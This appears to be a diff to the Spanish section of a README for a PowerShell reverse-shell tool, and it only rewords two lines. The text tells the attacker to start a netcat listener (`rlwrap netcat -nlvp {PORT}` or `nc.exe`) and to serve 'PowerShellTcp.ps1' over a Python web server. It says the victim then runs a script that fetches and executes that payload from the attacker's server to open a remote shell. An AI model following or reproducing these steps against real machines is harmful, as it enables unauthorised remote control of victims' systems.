@@ -94,13 +94,12 @@ La victima debe ejecutar este script con el "lenguaje de scripting PowerShell" `
 La victima debe ejecutar este script con el "lenguaje de scripting PowerShell" `pwsh ReverseShell.ps1`, llevara a la victima al servidor web que nosotros montaremos para que pueda leer y ejecutar "PowerShellTcp.ps1" y asi iniciar la ReverseShell.
 
 #### ATACANTE:
-**El atacante debe ejecutar dos scripts, uno "Shell" y el otro "Python3" o "Python2"**
+**El atacante debe ejecutar dos scripts, uno "Shell" y otro "Python3" o "Python2"**
 ##### Atacante
 1. - (GNU/LINUX) Debe ejecutar en la terminal `rlwrap netcat -nlvp {PORT}` para estar a la escucha del ReverseShell.
    - (Windows) Debe ir al directorio que se encuentra "nc.exe" y ejecutar en la cmd `nc.exe -nlvp {PORT}` para estar a la escucha del ReverseShell.
 
-2. - (GNU/LINUX) Ejecutar en la terminal `python3 -m http.server 8080` o `python2 -m SimpleHTTPServer 8080` para crear un servidor web en el directorio que se encuentra el archivo "PowerShellTcp.ps1" para cuando la victima ejecute su ReverseShell, lea y compile "PowerShellTcp.ps1" de nuestro servidor web y asi poder conectarnos.
-
+2. - (GNU/LINUX) En el directorio que se encuentra el archivo "PowerShellTcp.ps1" ejecute en la terminal `python3 -m http.server 8080` o `python2 -m SimpleHTTPServer 8080` para montar un servidor web.
 
 ## English
 
